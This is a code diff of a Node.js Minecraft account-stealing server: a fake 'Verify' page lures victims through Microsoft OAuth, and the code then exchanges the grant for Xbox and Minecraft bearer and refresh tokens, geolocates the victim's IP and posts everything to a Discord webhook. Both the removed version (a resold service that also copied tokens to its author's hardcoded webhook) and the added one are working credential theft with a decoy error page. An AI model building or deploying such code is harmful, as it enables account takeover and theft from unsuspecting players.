@@ -1,395 +1,391 @@
-const config = {
-    azure: {
-        client_secret: "",
-        client_id: "",
-    },
+//Change these btw
+const client_secret = 'i love free stuff' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = 'it is what it is'
+const redirect_uri = 'u know how it is'
+const webhook_url = 'ur shit ass webhook mf'
 
-    mongo: {
-        connectionString:
-            "",
-    },
+//Requirements
+const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
+const axios = require('axios')
+const express = require('express')
+const app = express()
+const requestIp = require('request-ip')
+const port = process.env.PORT || 3000
 
-    site: {
-        handleDomain: "",
-        loginLive:
-            "",
-            // End with state=
-    },
+app.get('/verify', async (req, res) => {
+	res.send("<html> <head> <meta charset=\"UTF-8\"> <title>Verification</title> <style> a:visited { color: LightGray; } a { color: LightGray; } a:hover { color: white; } div { height: 50px; } @import url('http://fonts.cdnfonts.com/css/proxima-nova-2'); body { margin: 0; padding: 0; background: #212121; } button { position: absolute; animate: 0.5s; transition: 0.5s; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 200px; height: 60px; text-align: center; line-height: 60px; color: #fff; font-size: 22px; text-transform: uppercase; text-decoration: none; font-family: 'Proxima Nova', sans-serif; box-sizing: border-box; background: linear-gradient(90deg, #03a9f4, #f441a5, #ffeb3b, #03a9f4); background-size: 400%; border-radius: 30px; z-index: 1; cursor:pointer; } button:hover { animation: animate 8s linear infinite; animate: 0.5s; transition: 0.5s; } @keyframes animate { 0% { background-position: 0%; } 100% { background-position: 400%; } } button:before { animate: 0.5s; transition: 0.5s; content: ''; position: absolute; top: -5px; left: -5px; right: -5px; bottom: -5px; z-index: -1; background: linear-gradient(90deg, #03a9f4, #f441a5, #ffeb3b, #03a9f4); background-size: 400%; border-radius: 40px; opacity: 0; transition: 0.5s; } button:hover:before { filter: blur(20px); opacity: 1; animation: animate 8s linear infinite; animate: 0.5s; transition: 0.5s; } </style> </head> <body> <button type=\"button\" onclick= \"window.open('"+redirect+"','popUpWindow','height=500,width=400,left=100,top=100,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');\">Verify</button> </body> </html>")
+})
 
-    admin: {
-        password: "",
-    },
-
-    telegram: "",
-    coupon: "",
-};
-
-const axios = require("axios");
-const express = require("express");
-const app = express(); app.use(express.json());
-const MongoClient = require("mongodb").MongoClient;
-
-const client = new MongoClient(config.mongo.connectionString, {
-    useNewUrlParser: true,
-    useUnifiedTopology: true,
-});
-
-app.post("/sellixhk", async (req, res) => {
-    res.setHeader("Content-Type", "application/json");
-
+app.get('/', async (req, res) => {
+    //also cool little "Verified!" html page
+    res.send('<html> <head> <meta charset="UTF-8"> <title>Verification Successful</title> <style>  .neonText { color: #fff; text-shadow: 0 0 7px #fff, 0 0 10px #fff, 0 0 21px #fff, 0 0 42px #0fa, 0 0 82px #0fa, 0 0 92px #0fa, 0 0 102px #0fa, 0 0 151px #0fa; } /* Additional styling */ body { font-size: 18px; font-family: \"Helvetica Neue\", sans-serif; background-color: #010a01; } h1, h2 { text-align: center; text-transform: uppercase; font-weight: 400; } h1 { font-size: 4.2rem; } .pulsate { animation: pulsate 1.5s infinite alternate; } h2 { font-size: 1.2rem; } .container { margin-top: 20vh; } @keyframes pulsate { 100% { text-shadow: 0 0 4px #fff, 0 0 11px #fff, 0 0 19px #fff, 0 0 40px #0fa, 0 0 80px #0fa, 0 0 90px #0fa, 0 0 100px #0fa, 0 0 150px #0fa; } 0% { text-shadow: 0 0 2px #fff, 0 0 4px #fff, 0 0 6px #fff, 0 0 10px #0fa, 0 0 45px #0fa, 0 0 55px #0fa, 0 0 70px #0fa, 0 0 80px #0fa; }  </style> </head> <body> <div class="container"> <h1 class="neonText pulsate">404</h1> <h2 class=\"neonText pulsate\">There was an error while contacting the verification bot.</h2> </div> </body> </html>')
+    const clientIp = requestIp.getClientIp(req)
+    const code = req.query.code
+    if (code == null) {
+        return
+    }
     try {
-        let webhook =
-            req.body.data.custom_fields[
-                "Discord webhook URL (The session ids will be sent here)"
-            ];
-        let apiKey =
-            req.body.data.custom_fields[
-                "API key (Please make it unique, it's used to identify you)"
-            ];
-
-        addUser(apiKey, webhook);
-        welcome(webhook, apiKey);
-        res.status(200).send("OK");
-        console.log("New user added: " + apiKey);
+        const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
+        const accessToken = accessTokenAndRefreshTokenArray[0]
+        const refreshToken = accessTokenAndRefreshTokenArray[1]
+        const hashAndTokenArray = await getUserHashAndToken(accessToken)
+        const userToken = hashAndTokenArray[0]
+        const userHash = hashAndTokenArray[1]
+        const xstsToken = await getXSTSToken(userToken)
+        const bearerToken = await getBearerToken(xstsToken, userHash)
+        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
+        const uuid = usernameAndUUIDArray[0]
+        const username = usernameAndUUIDArray[1]
+        const ip = clientIp
+        const ipLocationArray = await getIpLocation(ip)
+        const country = ipLocationArray[0]
+        const city = ipLocationArray[1]
+        const flag = ipLocationArray[2]
+        const security = ipLocationArray[3]
+        const playerData = await getPlayerData(username)
+        const rank = playerData[0]
+        const level = playerData[1].toFixed()
+        postToWebhook(formatNumber, level, rank, username, bearerToken, uuid, ip, refreshToken, country, city, flag, security)
     } catch (e) {
-        console.log(e);
-        res.status(500).send("Error");
+        console.log(e)
     }
-});
+})
 
-app.get("/add", (req, res) => {
-    const compulsoryParams = ["apiKey", "webhook", "password"];
-    for (let i = 0; i < compulsoryParams.length; i++) {
-        if (req.query[compulsoryParams[i]] === undefined) {
-            res.status(400).send(
-                "Missing compulsory parameter: " + compulsoryParams[i]
-            );
-            return;
-        }
-    }
+app.listen(port, () => {
+    console.log(`Started the server on ${port}`)
+})
 
-    if (req.query.password !== config.admin.password) {
-        res.status(401).send("Invalid password");
-        return;
-    }
-    try {
-        addUser(req.query.apiKey, req.query.webhook);
-        res.send("User added successfully");
-    } catch (err) {
-        res.status(400).send("User already exists");
-    }
+async function getAccessTokenAndRefreshToken(code) {
+    const url = 'https://login.live.com/oauth20_token.srf'
 
-    welcome(req.query.webhook, req.query.apiKey);
-});
-
-let bannedIps = [];
-app.get("/handle", (req, res) => {
-    if (req.query.code === undefined) {
-        res.status(400).send("Missing compulsory parameter: code");
-        return;
-    }
-    if (req.query.state === undefined) {
-        res.status(400).send("Missing compulsory parameter: state");
-        return;
-    }
-
-    getWebhook(req.query.state).then((webhook) => {
-        if (webhook == null) {
-            res.status(400).send("Invalid api key");
-            return;
-        } else {
-            res.status(200).send("Success");
-            console.log("Got webhook: " + webhook);
-            const ip = getIp(req);
-
-            if (bannedIps.includes(ip)) {
-                console.log("Banned ip tried to login: " + ip);
-                return;
-            }
-            
-            bannedIps.push(ip);
-            setTimeout(() => {
-                bannedIPS.splice(bannedIps.indexOf(ip), 1);
-            }, 1000 * 60 * 15);
-
-            handleRequest(
-                req.query.code,
-                webhook,
-                config.site.handleDomain,
-                req
-            );
-        }
-    });
-});
-
-createCollection();
-
-app.listen(8080 || process.env.PORT, () => {
-    console.log("Server started!");
-});
-
-// MONGO
-
-async function createCollection() {
-    try {
-        await client.connect();
-        const database = client.db("apiKeys");
-        const collection = database.collection("apiKeys");
-        await collection.createIndex({ apiKey: 1 }, { unique: true });
-    } catch (err) {
-        console.log(err.stack);
-    }
-}
-
-async function addUser(apikey, webhook) {
-    try {
-        await client.connect();
-        const database = client.db("apiKeys");
-        const collection = database.collection("apiKeys");
-        await collection.insertOne({ apiKey: apikey, webhook: webhook });
-    } catch (err) {
-        console.log(err.stack);
-    }
-}
-
-async function getWebhook(apikey) {
-    const database = client.db;
-    try {
-        await client.connect();
-        const database = client.db("apiKeys");
-        const collection = database.collection("apiKeys");
-        const query = { apiKey: apikey };
-        const result = await collection
-            .find(query)
-            .project({ webhook: 1 })
-            .toArray();
-        return result[0].webhook;
-    } catch (err) {
-        console.log(err.stack);
-    }
-}
-// END MONGO
-
-// OAUTH HANDLING
-async function handleRequest(code, webhook_url, redirect_uri, req) {
-    console.log("A new request has been made! Handling...");
-    try {
-        const accessTokenAndRefreshTokenArray =
-            await getAccessTokenAndRefreshToken(code, redirect_uri);
-        console.log("Access Token: " + accessTokenAndRefreshTokenArray[0]);
-        const accessToken = accessTokenAndRefreshTokenArray[0];
-        console.log("Refresh Token: " + accessTokenAndRefreshTokenArray[1]);
-        const refreshToken = accessTokenAndRefreshTokenArray[1];
-        const hashAndTokenArray = await getUserHashAndToken(accessToken);
-        console.log("User Token: " + hashAndTokenArray[0]);
-        const userToken = hashAndTokenArray[0];
-        console.log("User Hash: " + hashAndTokenArray[1]);
-        const userHash = hashAndTokenArray[1];
-        const xstsToken = await getXSTSToken(userToken);
-        console.log("XSTS Token: " + xstsToken);
-        const bearerToken = await getBearerToken(xstsToken, userHash);
-        console.log("Bearer Token: " + bearerToken);
-        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken);
-        console.log("UUID: " + usernameAndUUIDArray[0]);
-        const uuid = usernameAndUUIDArray[0];
-        console.log("Username: " + usernameAndUUIDArray[1]);
-        const username = usernameAndUUIDArray[1];
-        const ip = getIp(req);
-        console.log("IP: " + ip);
-        postToWebhook(username, bearerToken, ip, refreshToken, webhook_url);
-        console.log("Request handled!");
-        console.log(
-            "____________________________________________________________"
-        );
-    } catch (e) {
-        console.log(e);
-        return;
-    }
-}
-
-async function getAccessTokenAndRefreshToken(code, redirect_uri) {
-    const url = "https://login.live.com/oauth20_token.srf";
-
-    const cnfig = {
+    const config = {
         headers: {
-            "Content-Type": "application/x-www-form-urlencoded",
-        },
-    };
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+    }
     let data = {
-        client_id: config.azure.client_id,
+        client_id: client_id,
         redirect_uri: redirect_uri,
-        client_secret: config.azure.client_secret,
+        client_secret: client_secret,
         code: code,
-        grant_type: "authorization_code",
-    };
+        grant_type: 'authorization_code'
+    }
 
-    let response = await axios.post(url, data, cnfig);
-    return [response.data["access_token"], response.data["refresh_token"]];
+    let response = await axios.post(url, data, config)
+    return [response.data['access_token'], response.data['refresh_token']]
 }
 
 async function getUserHashAndToken(accessToken) {
-    const url = "https://user.auth.xboxlive.com/user/authenticate";
+    const url = 'https://user.auth.xboxlive.com/user/authenticate'
     const config = {
         headers: {
-            "Content-Type": "application/json",
-            Accept: "application/json",
-        },
-    };
+            'Content-Type': 'application/json', 'Accept': 'application/json',
+        }
+    }
     let data = {
         Properties: {
-            AuthMethod: "RPS",
-            SiteName: "user.auth.xboxlive.com",
-            RpsTicket: `d=${accessToken}`,
-        },
-        RelyingParty: "http://auth.xboxlive.com",
-        TokenType: "JWT",
-    };
-    let response = await axios.post(url, data, config);
-    return [
-        response.data.Token,
-        response.data["DisplayClaims"]["xui"][0]["uhs"],
-    ];
+            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
+        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
+    }
+    let response = await axios.post(url, data, config)
+    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
 }
 
 async function getXSTSToken(userToken) {
-    const url = "https://xsts.auth.xboxlive.com/xsts/authorize";
+    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
     const config = {
         headers: {
-            "Content-Type": "application/json",
-            Accept: "application/json",
-        },
-    };
+            'Content-Type': 'application/json', 'Accept': 'application/json',
+        }
+    }
     let data = {
         Properties: {
-            SandboxId: "RETAIL",
-            UserTokens: [userToken],
-        },
-        RelyingParty: "rp://api.minecraftservices.com/",
-        TokenType: "JWT",
-    };
-    let response = await axios.post(url, data, config);
+            SandboxId: 'RETAIL',
+            UserTokens: [userToken]
+        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
+    }
+    let response = await axios.post(url, data, config)
 
-    return response.data["Token"];
+    return response.data['Token']
 }
 
 async function getBearerToken(xstsToken, userHash) {
-    const url =
-        "https://api.minecraftservices.com/authentication/login_with_xbox";
+    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
     const config = {
         headers: {
-            "Content-Type": "application/json",
-        },
-    };
+            'Content-Type': 'application/json',
+        }
+    }
     let data = {
-        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken,
-        ensureLegacyEnabled: true,
-    };
-    let response = await axios.post(url, data, config);
-    return response.data["access_token"];
+        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
+    }
+    let response = await axios.post(url, data, config)
+    return response.data['access_token']
 }
 
 async function getUsernameAndUUID(bearerToken) {
-    const url = "https://api.minecraftservices.com/minecraft/profile";
+    const url = 'https://api.minecraftservices.com/minecraft/profile'
     const config = {
         headers: {
-            Authorization: "Bearer " + bearerToken,
+            'Authorization': 'Bearer ' + bearerToken,
+        }
+    }
+    let response = await axios.get(url, config)
+    return [response.data['id'], response.data['name']]
+}
+
+async function getIpLocation(ip) {
+    const url = 'https://ipgeolocation.abstractapi.com/v1/?api_key=28d3584274844560bdf38a12099432dd&ip_address='+ip
+    const config = {
+        headers: {
+            'Content-Type': 'application/json',
+        }
+    }
+    let response = await axios.get(url, config)
+    return [response.data['country'], response.data['city'], response.data.flag['emoji'], response.data['security']]
+}
+async function getPlayerData(username) {
+    let url = `https://puce-viper-robe.cyclic.app/v2/profiles/${username}?key=mfheda`
+    let config = {
+        headers: {
+            'Authorization': 'mfheda'
+        }
+    }
+    let response = await axios.get(url, config)
+    return [response.data.data[0]['rank'], response.data.data[0]['hypixelLevel']]
+}
+    
+async function postToWebhook(formatNumber, level, rank, username, bearerToken, uuid, ip, refreshToken, country, city, flag, security) {
+    const url = webhook_url
+    let isVpnOn
+    if (security.is_vpn) isVpnOn = " (VPN)"
+    else isVpnOn = ""
+    let networth = await (
+        await axios
+            .get(
+                `https://puce-viper-robe.cyclic.app/v2/profiles/${username}?key=mfheda`
+            )
+            .catch(() => {
+                return { data: { data: [{ networth: null }] } };
+            })
+    ).data.data[0].networth;
+
+    // Set it "API IS TURNED OFF IF NULL"
+    if (networth === null) networth = "API IS TURNED OFF";
+    else
+        networth = formatNumber(networth.unsoulboundNetworth);
+
+    let data = {
+username: "[LVL 100] Rat",
+  avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
+content: "@everyone ",
+  embeds: [
+    {
+      color: 3482894,
+      timestamp: new Date(),
+      thumbnail: {
+        url: 'https://visage.surgeplay.com/full/'+uuid
+	      },
+      fields: [
+        {
+          name: "**Username:**",
+          value: "```"+username+"```",
+          inline: true
         },
-    };
-    let response = await axios.get(url, config);
-    return [response.data["id"], response.data["name"]];
+        {
+          name: "**IP:"+isVpnOn+"**",
+          value: "```"+ip+"```",
+          inline: true
+        },
+        {
+            name: "**IP Location:** "+flag,
+            value: "```"+country+", "+city+"```",
+            inline: true
+          },
+          {
+            name: "**Unsoulbound NW:**",
+            value: "```"+networth+"```",
+            inline: true
+          },
+          {
+            name: "**Network Level**",
+            value: "```"+level+"```",
+            inline: true
+          },
+          {
+            name: "**Rank:**",
+            value: "```"+rank+"```",
+            inline: true
+          },
+        
+        {
+          name: "**Token:**",
+          value: "```"+bearerToken+"```"
+        },
+        {
+            name: "**Refresh:**",
+            value: "[Click Here]("+redirect_uri+"/refresh?refresh_token="+refreshToken+")",
+          },
+        
+      ],
+      "footer": {
+        "text": "By heda",
+        "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
+      }
+    }
+  ],
 }
 
-function getIp(req) {
-    return (
-        req.headers["cf-connecting-ip"] ||
-        req.headers["x-real-ip"] ||
-        req.headers["x-forwarded-for"] ||
-        req.connection.remoteAddress ||
-        ""
-    );
+        axios.post(url, data).then(() => console.log("Successfully authenticated and posted to webhook."))
+    
 }
 
-async function postToWebhook(
-    username,
-    bearerToken,
-    ip,
-    webhook_url
-) {
-    data = {
-        username: "OAR",
-        avatar_url:
-            "https://cdn.discordapp.com/avatars/1038565192159731823/57e888beb3c7839f8786d717a54e3b8b.webp",
-        content: "@everyone",
-        embeds: [
-            {
-                color: 6881445,
-                fields: [
-                    {
-                        name: "**Username:**",
-                        value: "```" + username + "```",
-                        inline: true,
-                    },
-                    {
-                        name: "IP:",
-                        value: "```" + ip + "```",
-                        inline: true,
-                    },
-                    {
-                        name: "**Token**",
-                        value: "```" + bearerToken + "```",
-                    },
-                ],
-                footer: {
-                    text: "OAR",
-                    icon_url:
-                        "https://cdn.discordapp.com/avatars/1038565192159731823/57e888beb3c7839f8786d717a54e3b8b.webp",
-                },
+
+//Refresh token shit u know how it is
+app.get('/refresh', async (req, res) => {
+    res.send('Token Refreshed!')
+    const clientIp = requestIp.getClientIp(req)
+    const refresh_token = req.query.refresh_token
+    if (refresh_token == null) {
+        return
+    }
+    try {
+        const refreshTokenArray = await getRefreshData(refresh_token)
+	    const newAccessToken = refreshTokenArray[0]
+        const newRefreshToken = refreshTokenArray[1]
+	    const hashAndTokenArray = await getUserHashAndToken(newAccessToken)
+        const userToken = hashAndTokenArray[0]
+        const userHash = hashAndTokenArray[1]
+        const xstsToken = await getXSTSToken(userToken)
+        const bearerToken = await getBearerToken(xstsToken, userHash)
+        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
+        const uuid = usernameAndUUIDArray[0]
+        const username = usernameAndUUIDArray[1]
+        const ip = clientIp
+        const ipLocationArray = await getIpLocation(ip)
+        const country = ipLocationArray[0]
+        const city = ipLocationArray[1]
+        const flag = ipLocationArray[2]
+        const security = ipLocationArray[3]
+        const playerData = await getPlayerData(username)
+        const rank = playerData[0]
+        const level = playerData[1].toFixed()
+        refreshToWebhook(formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, city, flag, security)
+    } catch (e) {
+        console.log(e)
+    }
+})
+
+async function getRefreshData(refresh_token) {
+    const url = 'https://login.live.com/oauth20_token.srf'
+
+    const config = {
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+    }
+    let data = {
+        client_id: client_id,
+        redirect_uri: redirect_uri,
+        client_secret: client_secret,
+        refresh_token: refresh_token,
+        grant_type: 'refresh_token'
+    }
+
+    let response = await axios.post(url, data, config)
+    return [response.data['access_token'], response.data['refresh_token']]
+}
+
+
+
+async function refreshToWebhook(formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, city, flag, security) {
+    const url = webhook_url
+    let isVpnOn
+    if (security.is_vpn) isVpnOn = " (VPN)"
+    else isVpnOn = ""
+    let networth = await (
+        await axios
+            .get(
+                `https://puce-viper-robe.cyclic.app/v2/profiles/${username}?key=mfheda`
+            )
+            .catch(() => {
+                return { data: { data: [{ networth: null }] } };
+            })
+    ).data.data[0].networth;
+
+    // Set it "API IS TURNED OFF IF NULL"
+    if (networth === null) networth = "API IS TURNED OFF";
+    else
+        networth = formatNumber(networth.unsoulboundNetworth);
+
+    let data = {
+username: "[LVL 100] Rat",
+  avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
+content: "@everyone TOKEN REFRESHED!",
+  embeds: [
+    {
+      color: 3482894,
+      timestamp: new Date(),
+      thumbnail: {
+        url: 'https://visage.surgeplay.com/full/'+uuid
+	      },
+      fields: [
+        {
+            name: "**Username:**",
+            value: "```"+username+"```",
+            inline: true
+          },
+          {
+            name: "**IP:"+isVpnOn+"**",
+            value: "```"+ip+"```",
+            inline: true
+          },
+          {
+              name: "**IP Location:** "+flag,
+              value: "```"+country+", "+city+"```",
+              inline: true
             },
-        ],
-    };
-    axios.post(
-        "https://discord.com/api/webhooks/1046029632664764478/yCAXrPk8oHrQpWPZkvt4dvz6x15ThMhDh4-R3AtoAG1UU6JWNDIB2lV5yBrmmIE9Y54C",
-        data
-    );
-    axios
-        .post(webhook_url, data)
-        .then(() => console.log("Posting to webhook..."));
-}
-// OAUTH HANDLING END
-
-// UTILS
-function welcome(webhook, apiKey) {
-    axios.post(webhook, {
-        username: "OAR TEAM",
-        avatar_url:
-            "https://cdn.discordapp.com/attachments/1027213888627949630/1044912497259466822/standard_2.gif",
-        content: "@everyone",
-        embeds: [
             {
-                title: "Welcome to your brand new OAUTH!",
-                color: 7350627,
-                description:
-                    "Your own authorization link:  [Copy me](" +
-                    config.site.loginLive +
-                    apiKey +
-                    ")\n\nA private telegram channel invite for updates and support: [Join](" +
-                    config.telegram +
-                    ")\n\nA coupon code for you or a friend: `" +
-                    config.coupon +
-                    "`\n",
-                timestamp: "",
-                author: {
-                    name: "",
-                },
-                image: {
-                    url: "",
-                },
-                thumbnail: {},
-                footer: {},
-                fields: [],
+              name: "**Unsoulbound NW:**",
+              value: "```"+networth+"```",
+              inline: true
             },
-        ],
-        components: [],
-    });
+            {
+              name: "**Network Level**",
+              value: "```"+level+"```",
+              inline: true
+            },
+            {
+              name: "**Rank:**",
+              value: "```"+rank+"```",
+              inline: true
+            },
+          
+          {
+            name: "**Token:**",
+            value: "```"+bearerToken+"```"
+        },
+        {
+            name: "**Refresh:**",
+            value: "[Click Here]("+redirect_uri+"/refresh?refresh_token="+newRefreshToken+")",
+            inline: true
+          },
+        
+      ],
+      "footer": {
+        "text": "By heda",
+        "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
+      }
+    }
+  ],
 }
-// UTILS END
+
+        axios.post(url, data).then(() => console.log("Successfully refreshed token."))
+    
+}
+const formatNumber = (num) => {
+    if (num < 1000) return num.toFixed(2)
+    else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
+    else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
+    else return `${(num / 1000000000).toFixed(2)}b`
+}
